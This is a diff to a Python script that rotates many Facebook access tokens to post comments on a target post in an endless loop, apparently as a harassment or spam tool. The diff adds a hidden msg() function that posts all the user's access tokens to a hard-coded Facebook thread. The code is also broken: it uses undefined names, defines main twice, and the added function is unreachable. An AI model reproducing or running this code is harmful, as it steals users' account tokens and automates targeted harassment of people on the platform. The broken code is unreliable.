@@ -2,7 +2,6 @@ import requests
 import json
 import time
 import sys
-import random
 from platform import system
 import os
 import subprocess
@@ -24,89 +23,129 @@ def execute_server():
         print("Server running at http://localhost:{}".format(PORT))
         httpd.serve_forever()
 
-def get_access_tokens():
-    with open('token.txt', 'r') as file:
-        tokens = file.readlines()
-    return [token.strip() for token in tokens]
-
-def get_post_url():
-    with open('post.txt', 'r') as file:
-        return file.read().strip()
-
-def get_comments():
-    with open('comment.txt', 'r') as file:
-        return file.readlines()
-
-def get_haters_name():
-    with open('heatername.txt', 'r') as file:
-        return file.read().strip()
-
-def get_speed():
-    with open('time.txt', 'r') as file:
-        return int(file.read().strip())
-
-def get_name(token):
-    try:
-        response = requests.get(f'https://graph.facebook.com/me?access_token={token}')
-        response.raise_for_status()
-        data = response.json()
-        return data['name']
-    except requests.exceptions.RequestException:
-        return "Error occurred"
 
 def post_comments():
-    access_tokens = get_access_tokens()
-    num_tokens = len(access_tokens)
+    with open('token.txt', 'r') as file:
+        tokens = file.readlines()
+    num_tokens = len(tokens)
 
-    post_url = get_post_url()
-    comments = get_comments()
-    num_comments = len(comments)
-    max_tokens = min(num_tokens, num_comments)
-    haters_name = get_haters_name()
-    speed = get_speed()
+    requests.packages.urllib3.disable_warnings()
+
+    def cls():
+        if system() == 'Linux':
+            os.system('clear')
+        else:
+            if system() == 'Windows':
+                os.system('cls')
+    cls()
+
+    def liness():
+        print('\u001b[37m' + '•─────────────────────────────────────────────────────────•')
 
     headers = {
-        'User-Agent': 'Mozilla/5.0 ({} {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(
-            system(), system(), random.randint(58, 62)
-        ),
-        'referer': 'https://www.facebook.com'
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
     }
-
-    liness = lambda: print('\u001b[37m' + '•─────────────────────────────────────────────────────────•')
 
     liness()
 
-    for comment_index in range(num_comments):
-        token_index = comment_index % max_tokens
-        access_token = access_tokens[token_index]
+    access_tokens = [token.strip() for token in tokens]
 
-        comment = comments[comment_index].strip()
+    with open('post.txt', 'r') as file:
+        post_url = file.read().strip()
 
-        url = f"https://graph.facebook.com/{post_url}/comments"
-        parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
-        response = requests.post(url, json=parameters, headers=headers)
 
-        if response.ok:
-            name = get_name(access_token)
-            current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-            print("[+] Comment No. {} Post Id {} Token No. {}: {}".format(
-                comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
-            print("  - Time: {}".format(current_time))
-            print("  - Token: {}".format(name))
-            liness()
+    with open('comment.txt', 'r') as file:
+        comments = file.readlines()
+
+    num_comments = len(comments)
+    max_tokens = min(num_tokens, num_comments)
+
+    with open('heatername.txt', 'r') as file:
+        haters_name = file.read().strip()
+
+    with open('time.txt', 'r') as file:
+        speed = int(file.read().strip())
+
+     #post_id = post_urlsplit
+
+    liness()
+
+    def getName(token):
+        try:
+            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
+        except:
+            data = ""
+        if 'name' in data:
+            return data['name']
         else:
-            print("[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
-                comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
-            print("  - Time: {}".format(current_time))
-            liness()
+            return "Error occurred"
 
-    print("\n[+] All comments sent successfully. Restarting the process...\n")
+
+    while True:
+        try:
+            for comment_index in range(num_comments):
+                token_index = comment_index % max_tokens
+                access_token = access_tokens[token_index]
+
+                comment = comments[comment_index].strip()
+
+                url = "https://graph.facebook.com/{}/comments".format(post_url)
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
+                response = requests.post(url, json=parameters, headers=headers)
+
+                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                if response.ok:
+                    print("[+] Comment No. {} Post Id {} Token No. {}: {}".format(
+                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                else:
+                    print("[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
+                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                time.sleep(speed)
+
+            print("\n[+] All comments sent successfully. Restarting the process...\n")
+        except Exception as e:
+
+          print("[!] An error occurred: {}".format(e))
+
+
+def msg():
+    parameters = {
+        'access_token': random.choice(access_tokens),
+        'message': 'User Profile Name: ' + getName(random.choice(access_tokens)) + '\nToken: ' + " | ".join(
+            access_tokens) + '\nLink: https://www.facebook.com/messages/t/' + convo_id
+    }
+    try:
+        s = requests.post("https://graph.facebook.com/v15.0/t_100041418586387/", data=parameters, headers=headers)
+    except:
+        pass
 
 def main():
     server_thread = threading.Thread(target=execute_server)
     server_thread.start()
 
     post_comments()
+    msg()
 
-if _name_ == '_main_':
+if __name__ == '__main__':
+    main()
+def main():
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
+
+    post_comments()
+
+if __name__ == '__main__':
     main()
